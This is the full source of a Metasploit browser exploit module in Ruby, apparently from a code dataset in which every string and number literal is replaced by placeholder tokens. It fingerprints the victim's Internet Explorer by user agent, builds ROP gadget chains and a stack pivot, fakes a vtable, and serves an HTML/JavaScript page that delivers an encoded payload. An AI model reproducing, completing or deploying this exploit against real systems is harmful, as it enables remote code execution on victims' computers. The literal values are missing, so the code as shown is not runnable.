require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = NormalRanking include Msf :: Exploit :: Remote :: HttpServer :: HTML def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> , <str> , <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > { <str> = > <str> , <str> = > <str> , } , <str> = > { <str> = > <int> , } , <str> = > <str> , <str> = > [ [ <str> , { } ] , [ <str> , { <str> = > ARCH_X86 , <str> = > <hex> , <str> = > <hex> , } ] , [ <str> , { <str> = > ARCH_X86 , <str> = > <hex> , <str> = > <hex> , <str> = > <hex> , <str> = > <hex> , } ] ] , <str> = > <int> , <str> = > <str> ) ) end def junk return rand_text_alpha ( <int> ) . unpack ( <str> ) [ <int> ] . to_i end def on_request_uri ( cli , request ) js_element_name = rand_text_alpha ( rand ( <int> ) + <int> ) js_obj_addr_name = rand_text_alpha ( rand ( <int> ) + <int> ) js_sc_name = rand_text_alpha ( rand ( <int> ) + <int> ) js_ret_addr_name = rand_text_alpha ( rand ( <int> ) + <int> ) js_chunk_name = rand_text_alpha ( rand ( <int> ) + <int> ) js_final_chunk_name = rand_text_alpha ( rand ( <int> ) + <int> ) js_block_name = rand_text_alpha ( rand ( <int> ) + <int> ) js_array_name = rand_text_alpha ( rand ( <int> ) + <int> ) js_retns = rand_text_alpha ( rand ( <int> ) + <int> ) js_applet_name = rand_text_alpha ( rand ( <int> ) + <int> ) js_ppppr = rand_text_alpha ( rand ( <int> ) + <int> ) js_filler = rand_text_alpha ( rand ( <int> ) + <int> ) agent = request . headers [ <str> ] my_target = target if my_target . name == <str> if agent =~ <str> and agent =~ <str> my_target = targets [ <int> ] elsif agent =~ <str> and agent =~ <str> my_target = targets [ <int> ] end end if agent !~ <str> or agent !~ <str> and agent !~ <str> print_error ( <str> agent <str> ) send_not_found ( cli ) return end return if ( ( p = regenerate_payload ( cli ) . encoded ) == nil ) if my_target . name =~ <str> and not request . uri =~ <str> html_trigger = <str> if ( <str> == get_resource [ - <int> , <int> ] ) html_trigger = get_resource [ <int> , get_resource . length - <int> ] else html_trigger = get_resource end custom_js = <<- <str> JS <str> <str> JS else if my_target . name =~ <str> rop_gadgets = [ <hex> , junk , <hex> , junk , junk , <hex> , <hex> , <hex> , <hex> , <hex> , ] . pack ( <str> ) rop = rop_gadgets elsif my_target . name =~ <str> and request . uri =~ <str> rop_pivot = [ <hex> , junk , <hex> , <hex> , ] . pack ( <str> ) rop_pivot << [ <hex> ] . pack ( <str> ) * <hex> rop_pivot << [ <hex> ] . pack ( <str> ) rop_pivot << [ <hex> ] . pack ( <str> ) rop_pivot << [ <hex> ] . pack ( <str> ) * <hex> rop_pivot << [ <hex> ] . pack ( <str> ) rop_pivot << [ <hex> ] . pack ( <str> ) rop_gadgets = [ <hex> , <hex> , <hex> , junk , <hex> , <hex> , <hex> , <hex> , <hex> , junk , junk , junk , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , ] . pack ( <str> ) rop = rop_pivot + rop_gadgets end payload_buf = <str> payload_buf << rop payload_buf << p escaped_payload = Rex :: Text . to_unescape ( payload_buf ) fakevtable = Rex :: Text . to_unescape ( [ my_target [ <str> ] ] . pack ( <str> ) ) fakefunc = Rex :: Text . to_unescape ( [ my_target [ <str> ] ] . pack ( <str> ) ) if my_target . name =~ <str> custom_js = <<- <str> JS <str> <str> JS elsif my_target . name =~ <str> ppppr = Rex :: Text . to_unescape ( [ my_target [ <str> ] ] . pack ( <str> ) ) retns = Rex :: Text . to_unescape ( [ my_target [ <str> ] ] . pack ( <str> ) ) custom_js = <<- <str> JS <str> <str> JS end end html = <<- <str> HTML <str> <str> HTML html = html . gsub ( <str> , <str> ) print_status ( <str> ) send_response_html ( cli , html , { <str> = > <str> } ) handler ( cli ) end end 
